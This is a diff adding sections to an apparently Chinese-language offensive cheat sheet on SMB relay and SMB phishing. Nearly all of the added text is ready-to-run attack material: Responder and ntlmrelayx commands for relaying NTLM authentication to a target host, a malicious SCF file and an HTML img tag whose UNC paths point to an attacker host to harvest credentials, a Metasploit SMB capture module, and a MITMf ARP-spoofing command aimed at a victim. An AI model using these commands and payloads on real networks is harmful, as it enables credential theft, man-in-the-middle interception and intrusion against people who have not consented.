@@ -209,3 +209,45 @@ exploit
 ```Bash
 responder -I eth0 -wF
 ```
+
+## SMB中继
+
+```Bash
+responder -I eth0 -v
+python ntlmrelayx.py -t smb://目标主机IP地址 --no-smb-server
+```
+
+## SMB钓鱼
+
+### Responder
+```Bash
+responder -I eth0 -wF -P
+```
+
+### SCF文件
+
+```Bash
+[Shell]
+Command=2
+IconFile=\\\\攻击者主机IP地址\\share\\icon.ico
+[Taskbar]
+Command=ToggleDesktop
+```
+
+### auxiliary/server/capture/smb
+
+```Bash
+use auxiliary/server/capture/smb
+set JOHNPWFILE /path/to/john.pot
+exploit
+```
+
+### MITMF
+
+```html
+img src="\\主机IP地址\image.jpg"
+```
+
+```Bash
+python mitmf.py -spoof -arp -smbtrap -target 受害者IP地址 -gateway 网关地址 -i eth0
+```
